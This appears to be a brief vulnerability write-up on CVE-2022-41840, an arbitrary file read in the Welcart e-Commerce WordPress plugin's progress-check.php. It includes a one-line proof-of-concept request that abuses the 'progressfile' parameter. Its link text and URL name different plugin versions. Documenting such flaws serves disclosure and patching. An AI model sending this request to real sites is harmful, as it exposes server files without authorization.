# WordPress Welcart e-Commerce progress-check.php Arbitrary file reading vulnerability CVE-2022-41840

## Vulnerability Description

WordPress Welcart e-Commerce plug-in progress-check.php file, there is a vulnerability to read any file in the server. The attacker has suffered a vulnerability and can obtain any file information in the server.

## Vulnerability Impact

<span style="background-color:rgb(18, 160, 255); padding: 2px 4px; border-radius: 3px; color: white;">WordPress Welcart e-Commerce <= 2.7.7</span>

## Plugin Name

<span style="background-color:rgb(18, 160, 255); padding: 2px 4px; border-radius: 3px; color: white;">Welcart e-Commerce</span>

<span style="background-color:rgb(18, 160, 255); padding: 2px 4px; border-radius: 3px; color: white;">[https://downloads.wordpress.org/plugin/usc-e-shop.2.7.7.zip](https://downloads.wordpress.org/plugin/usc-e-shop.2.8.6.zip)</span>

## Vulnerability reappears

After downloading, compare the updated files usc-e-shop/functions/progress-check.php

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1670123688240-66149996-02ad-454c-b080-9f73aeee2d65.png)

Fixed arbitrary file reading vulnerability caused by parameter progressfile filtering problem, verify POC

```plain
/wp-content/plugins/usc-e-shop/functions/progress-check.php?progressfile=progress-check.php
```

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1670124131616-e73f7229-841d-4634-800d-3f913440124f.png)